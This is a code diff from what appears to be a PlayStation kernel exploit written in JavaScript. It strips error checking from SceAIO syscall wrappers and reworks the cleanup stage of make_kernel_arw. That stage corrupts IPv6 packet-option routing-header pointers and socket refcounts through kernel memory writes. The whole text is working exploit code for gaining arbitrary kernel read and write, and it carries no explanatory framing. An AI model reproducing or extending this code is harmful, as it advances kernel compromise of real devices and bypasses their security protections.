@@ -222,12 +222,7 @@ function call_nze(...args) {
 //     SceKernelAioSubmitId ids[]
 // );
 function aio_submit_cmd(cmd, requests, num_requests, handles) {
-    
-   const ret = sysi('aio_submit_cmd', cmd, requests, num_requests, 3, handles);
-      if (ret < 0) {
-    throw new Error(`aio_submit_cmd() error: ${ret}`);
-  }
-  return ret;
+    sysi('aio_submit_cmd', cmd, requests, num_requests, 3, handles);
 }
 
 // the various SceAIO syscalls that copies out errors/states will not check if
@@ -243,14 +238,7 @@ const _aio_errors_p = _aio_errors.addr;
 //     int sce_errors[]
 // );
 function aio_multi_delete(ids, num_ids, sce_errs=_aio_errors_p) {
-
-    
-    const ret =sysi('aio_multi_delete', ids, num_ids, sce_errs);
-
-     if (ret < 0) {
-    throw new Error(`aio_multi_delete() error: ${ret}`);
-  }
-  return ret;
+    sysi('aio_multi_delete', ids, num_ids, sce_errs);
 }
 
 // int
@@ -260,14 +248,7 @@ function aio_multi_delete(ids, num_ids, sce_errs=_aio_errors_p) {
 //     int states[]
 // );
 function aio_multi_poll(ids, num_ids, sce_errs=_aio_errors_p) {
-
-    
-   const ret = sysi('aio_multi_poll', ids, num_ids, sce_errs);
-
-     if (ret < 0) {
-    throw new Error(`aio_multi_poll() error: ${ret}`);
-  }
-  return ret;
+    sysi('aio_multi_poll', ids, num_ids, sce_errs);
 }
 
 // int
@@ -277,12 +258,7 @@ function aio_multi_poll(ids, num_ids, sce_errs=_aio_errors_p) {
 //     int states[]
 // );
 function aio_multi_cancel(ids, num_ids, sce_errs=_aio_errors_p) {
-     const ret =sysi('aio_multi_cancel', ids, num_ids, sce_errs);
-
-      if (ret < 0) {
-    throw new Error(`aio_multi_cancel() error: ${ret}`);
-  }
-  return ret;
+    sysi('aio_multi_cancel', ids, num_ids, sce_errs);
 }
 
 // // wait for all (AND) or atleast one (OR) to finish
@@ -1493,38 +1469,9 @@ function make_kernel_arw(pktopts_sds, dirty_sd, k100_addr, kernel_addr, sds) {
      const off_ip6po_rthdr = 0x68;
      const r_rthdr_p = r_pktopts.add(off_ip6po_rthdr);
      const w_rthdr_p = w_pktopts.add(off_ip6po_rthdr);
-     //kmem.write64(r_rthdr_p, 0);
-   //  kmem.write64(w_rthdr_p, 0);
-    // log('corrupt pointers cleaned');
-
-
-for (let i = 0; i < sds.length; i++) {
-    let sock_pktopts = get_sock_pktopts(sds[i], kmem.read64);
-    kmem.write64(sock_pktopts + off_ip6po_rthdr, 0n);  // scrive zero a 64 bit
-}
-
-let reclaimer_pktopts = get_sock_pktopts(reclaim_sock, kmem.read64);
-
-kmem.write64(reclaimer_pktopts + off_ip6po_rthdr, 0n);
-kmem.write64(worker_pktopts + off_ip6po_rthdr, 0n);
-
-let sock_increase_ref = [
-    ipv6_kernel_rw.data.master_sock,
-    ipv6_kernel_rw.data.victim_sock,
-    master_sock,
-    worker_sock,
-    reclaimsock,
-];
-
-
-for (let each of sock_increase_ref) {
-    let sock_addr = get_fd_data_addr(each, kmem.read64);
-    kmem.write32(sock_addr + 0x0, 0x100);
-}
-
-log("[+] IPv6 race structures and refcounts fixed");
-
-    
+     kmem.write64(r_rthdr_p, 0);
+     kmem.write64(w_rthdr_p, 0);
+     log('corrupt pointers cleaned');
 
     /*
     // REMOVE once restore kernel is ready for production
